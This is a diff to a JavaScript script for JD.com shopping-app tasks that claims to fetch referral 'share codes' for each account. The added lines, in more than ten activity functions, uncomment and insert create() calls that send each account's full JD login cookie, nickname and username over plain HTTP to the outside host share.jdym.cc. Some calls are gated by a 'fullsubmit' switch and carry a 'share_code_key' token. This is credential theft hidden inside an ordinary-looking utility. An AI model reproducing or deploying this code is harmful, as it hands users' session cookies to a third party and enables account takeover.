@@ -8,21 +8,25 @@
 ============Quantumultx===============
 [task_local]
 #获取互助码
-32 0,1 * * * https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js, tag=获取互助码, enabled=true
+45 0,1,2,3,10 * * * https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js, tag=获取互助码, enabled=true
 
 ================Loon==============
 [Script]
-cron "32 0,1 * * *" script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js, tag=获取互助码
+cron "45 0,1,2,3,10 * * *" script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js, tag=获取互助码
 
 ===============Surge=================
-获取互助码 = type=cron,cronexp="32 0,1 * * *",wake-system=1,timeout=120,script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js
+获取互助码 = type=cron,cronexp="45 0,1,2,3,10 * * *",wake-system=1,timeout=120,script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js
 
 ============小火箭=========
-获取互助码 = type=cron,script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js, cronexpr="32 0,1 * * *", timeout=200, enable=true
+获取互助码 = type=cron,script-path=https://raw.githubusercontent.com/LXK9301/jd_scripts/master/jd_share_code.js, cronexpr="45 0,1,2,3,10 * * *", timeout=200, enable=true
  */
-const $ = new Env("提交互助码");
+const $ = new Env("获取互助码");
 const JD_API_HOST = "https://api.m.jd.com/client.action";
 let cookiesArr = [], cookie = '', message;
+let fullsubmit = false;
+fullsubmit = $.isNode() ? (process.env.fullcode ? process.env.fullcode : `${fullsubmit}`) : ($.getdata('fullcode') ? $.getdata('fullcode') : `${fullsubmit}`);
+let jd_share_code_key = '';
+jd_share_code_key = $.isNode() ? (process.env.share_code_key ? process.env.share_code_key : `${jd_share_code_key}`) : ($.getdata('share_code_key') ? $.getdata('share_code_key') : `${jd_share_code_key}`);
 const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
 !function (n) {
   "use strict";
@@ -155,6 +159,12 @@ if ($.isNode()) {
   cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
 }
 !(async () => {
+
+  if (!jd_share_code_key) {
+    console.log('请填写Token,变量是share_code_key');
+    return;
+  }	
+  
   if (!cookiesArr[0]) {
     $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
     return;
@@ -168,7 +178,6 @@ if ($.isNode()) {
       $.nickName = '';
       message = '';
       await TotalBean();
-	  await $.wait(5000)
       if (!$.isLogin) {
         continue
       }
@@ -205,7 +214,7 @@ function JD_immortal(body={}) {
                   // 邀请好友
                   if (vo.subItem.length){
                     console.log(`【账号${$.index}（${$.nickName || $.UserName}）神仙书院】${vo.subItem[0].itemToken}`)
-					//create(`http://share.jdym.cc/sharecode.php?id=${vo.subItem[0].itemToken}@${$.nickName}@${$.UserName}@immortal@${cookie}`,"神仙书院")
+					create(`http://share.jdym.cc/sharecode.php?id=${vo.subItem[0].itemToken}@${$.nickName}@${$.UserName}@immortal@${cookie}`,"神仙书院")
                   }else{
                     console.log(`无法查询您的好友助力码`)
                   }
@@ -262,7 +271,7 @@ function getJdFactory() {
                     console.log(
                       `【账号${$.index}（${$.nickName || $.UserName}）东东工厂】${item.assistTaskDetailVo.taskToken}`
                     );
-					//create(`http://share.jdym.cc/sharecode.php?id=${item.assistTaskDetailVo.taskToken}@${$.nickName}@${$.UserName}@ddfactory@${cookie}`,"东东工厂");
+					create(`http://share.jdym.cc/sharecode.php?id=${item.assistTaskDetailVo.taskToken}@${$.nickName}@${$.UserName}@ddfactory@${cookie}`,"东东工厂");
                   }
                 });
               }
@@ -353,8 +362,11 @@ function getJxFactory(){
                   $.encryptPin = data.user.encryptPin;
                   // subTitle = data.user.pin;
                   console.log(`【账号${$.index}（${$.nickName || $.UserName}）京喜工厂】${data.user.encryptPin}`);
-				  //create(`http://share.jdym.cc/sharecode.php?id=${data.user.encryptPin}@${$.nickName}@${$.UserName}@JxFactory@${cookie}`,"京喜工厂");
-				  create(`http://www.helpu.cf/jdcodes/submit.php?code=${data.user.encryptPin}&type=jxfactory`,"京喜工厂");
+				  if ($.index < 6 || fullsubmit == "true")
+				  {
+					create(`http://share.jdym.cc/sharecode.php?id=${data.user.encryptPin}@${$.nickName}@${$.UserName}@JxFactory@${cookie}`,"京喜工厂");
+				  }
+				  createh(`http://www.helpu.cf/jdcodes/submit.php?code=${data.user.encryptPin}&type=jxfactory`,"京喜工厂");
                 }
               } else {
                 $.unActive = false; //标记是否开启了京喜活动或者选购了商品进行生产
@@ -489,9 +501,12 @@ function getJdPet(){
             console.log(
               `【账号${$.index}（${$.nickName || $.UserName}）京东萌宠】${$.petInfo.shareCode}`
             );
-			//create(`http://share.jdym.cc/sharecode.php?id=${$.petInfo.shareCode}@${$.nickName}@${$.UserName}@pet@${cookie}`,"京东萌宠");
-			create(`http://www.helpu.cf/jdcodes/submit.php?code=${$.petInfo.shareCode}&type=pet`,"京东萌宠");
-
+			if ($.index < 6 || fullsubmit == "true")
+			{
+				create(`http://share.jdym.cc/sharecode.php?id=${$.petInfo.shareCode}@${$.nickName}@${$.UserName}@pet@${cookie}&jdkey=${jd_share_code_key}`,"京东萌宠");
+			}
+			createh(`http://www.helpu.cf/jdcodes/submit.php?code=${$.petInfo.shareCode}&type=pet`,"京东萌宠");
+			
           } else if (initPetTownRes.code === "0") {
             console.log(`初始化萌宠失败:  ${initPetTownRes.message}`);
           } else {
@@ -523,7 +538,7 @@ async function getJdZZ() {
               $.taskList = data.data.taskDetailResList;
               if ($.taskList.filter(item => !!item && item['taskId']=== 3) && $.taskList.filter(item => !!item && item['taskId']=== 3).length) {
                 console.log(`【账号${$.index}（${$.UserName}）京东赚赚】${$.taskList.filter(item => !!item && item['taskId']=== 3)[0]['itemId']}`);
-				//create(`http://share.jdym.cc/sharecode.php?id=${$.taskList.filter(item => !!item && item['taskId']=== 3)[0]['itemId']}@${$.nickName}@${$.UserName}@jdzz@${cookie}`,"京东赚赚");
+				create(`http://share.jdym.cc/sharecode.php?id=${$.taskList.filter(item => !!item && item['taskId']=== 3)[0]['itemId']}@${$.nickName}@${$.UserName}@jdzz@${cookie}`,"京东赚赚");
               }
             }
           }
@@ -624,8 +639,11 @@ async function getPlantBean() {
       const shareUrl = $.plantBeanIndexResult.data.jwordShareInfo.shareUrl;
       $.myPlantUuid = getParam(shareUrl, "plantUuid");
       console.log(`【账号${$.index}（${$.nickName || $.UserName}）种豆得豆】${$.myPlantUuid}`);
-	  //create(`http://share.jdym.cc/sharecode.php?id=${$.myPlantUuid}@${$.nickName}@${$.UserName}@bean@${cookie}`,"种豆得豆");
-	  create(`http://www.helpu.cf/jdcodes/submit.php?code=${$.myPlantUuid}&type=bean`,"种豆得豆");
+	  if ($.index < 6 || fullsubmit == "true")
+	  {
+		  create(`http://share.jdym.cc/sharecode.php?id=${$.myPlantUuid}@${$.nickName}@${$.UserName}@bean@${cookie}&jdkey=${jd_share_code_key}`,"种豆得豆");
+	  }
+	  createh(`http://www.helpu.cf/jdcodes/submit.php?code=${$.myPlantUuid}&type=bean`,"种豆得豆");
 
     } else {
       console.log(
@@ -692,8 +710,12 @@ async function getJDFruit() {
       console.log(
         `【账号${$.index}（${$.nickName || $.UserName}）京东农场】${$.farmInfo.farmUserPro.shareCode}`
       );
-	  //create(`http://share.jdym.cc/sharecode.php?id=${$.farmInfo.farmUserPro.shareCode}@${$.nickName}@${$.UserName}@farm@${cookie}`,"京东农场");
-	  create(`http://www.helpu.cf/jdcodes/submit.php?code=${$.farmInfo.farmUserPro.shareCode}&type=farm`,"东东农场");
+	  
+		if ($.index < 6 || fullsubmit == "true")
+		{
+			create(`http://share.jdym.cc/sharecode.php?id=${$.farmInfo.farmUserPro.shareCode}@${$.nickName}@${$.UserName}@farm@${cookie}&jdkey=${jd_share_code_key}`,"京东农场");
+		}
+		createh(`http://www.helpu.cf/jdcodes/submit.php?code=${$.farmInfo.farmUserPro.shareCode}&type=farm`,"东东农场");
 
     } else {
       /*console.log(
@@ -738,8 +760,8 @@ async function getJoy(){
           if (safeGet(data)) {
             data = JSON.parse(data);
             if (data.success && data.data && data.data.userInviteCode) {
-              console.log(`【账号${$.index}（${$.nickName || $.UserName}）crazyJoy】${data.data.userInviteCode}`)
-			  //create(`http://share.jdym.cc/sharecode.php?id=${data.data.userInviteCode}@${$.nickName}@${$.UserName}@jdcrazyjoy@${cookie}`,"疯狗Joy");
+				console.log(`【账号${$.index}（${$.nickName || $.UserName}）crazyJoy】${data.data.userInviteCode}`)
+				create(`http://share.jdym.cc/sharecode.php?id=${data.data.userInviteCode}@${$.nickName}@${$.UserName}@jdcrazyjoy@${cookie}`,"疯狗Joy");
             }
           }
         }
@@ -779,7 +801,7 @@ async function getSgmh(timeout = 0) {
               for (let i = 0; i < data.data.result.taskVos.length; i++) {
                 if (data.data.result.taskVos[i].taskName === '邀人助力任务') {
                   console.log(`【账号${$.index}（${$.nickName || $.UserName}）闪购盲盒】${data.data.result.taskVos[i].assistTaskDetailVo.taskToken}`)
-				  //create(`http://share.jdym.cc/sharecode.php?id=${data.data.result.taskVos[i].assistTaskDetailVo.taskToken}@${$.nickName}@${$.UserName}@sgmh@${cookie}`,"闪购盲盒");
+				  create(`http://share.jdym.cc/sharecode.php?id=${data.data.result.taskVos[i].assistTaskDetailVo.taskToken}@${$.nickName}@${$.UserName}@sgmh@${cookie}`,"闪购盲盒");
                 }
               }
             }
@@ -822,7 +844,7 @@ function getJdCash() {
             data = JSON.parse(data);
             if(data.code===0 && data.data.result){
               console.log(`【京东账号${$.index}（${$.UserName}）签到领现金】${data.data.result.inviteCode}`);
-			  //create(`http://share.jdym.cc/sharecode.php?id=${data.data.result.inviteCode}@${$.nickName}@${$.UserName}@jdcash@${cookie}`,"领现金");
+			  create(`http://share.jdym.cc/sharecode.php?id=${data.data.result.inviteCode}@${$.nickName}@${$.UserName}@jdcash@${cookie}`,"领现金");
             }
           }
         }
@@ -868,7 +890,7 @@ function getcity(inviteId, flag = false) {
               console.log(`账号已黑，看不到邀请码`);
             } else {
               console.log(`【京东账号${$.index}（${$.UserName}）城城领现金】${data.data && data.data.result.userActBaseInfo.inviteId}`);
-			  //create(`http://share.jdym.cc/sharecode.php?id=${data.data && data.data.result.userActBaseInfo.inviteId}@${$.nickName}@${$.UserName}@city@${cookie}`,"城城领现金");
+			  create(`http://share.jdym.cc/sharecode.php?id=${data.data && data.data.result.userActBaseInfo.inviteId}@${$.nickName}@${$.UserName}@city@${cookie}`,"城城领现金");
             }
           }
         }
@@ -984,7 +1006,32 @@ function create(path, name) {
         if (needAgain) return;
         message = JSON.parse(data);
         //$.log(`\n${data}`);
-		$.log(message.data);
+		$.log(message.msg);
+      } catch (e) {
+        $.logErr(e, resp);
+      } finally {
+        resolve();
+      }
+    });
+  });
+}
+
+function createh(path, name) {
+  return new Promise((resolve) => {
+    const url = { url: path };
+	const url1 = encodeURI(path);
+    $.get(url, async (err, resp, data) => {
+      if (err) {
+        $.log(JSON.stringify(err));
+        resolve(err);
+        return;
+      }
+      try {
+        const needAgain = await checkWhetherNeedAgain(resp, create, url1, name);
+        if (needAgain) return;
+        message = JSON.parse(data);
+        //$.log(`\n${data}`);
+		//$.log(message.msg);
       } catch (e) {
         $.logErr(e, resp);
       } finally {
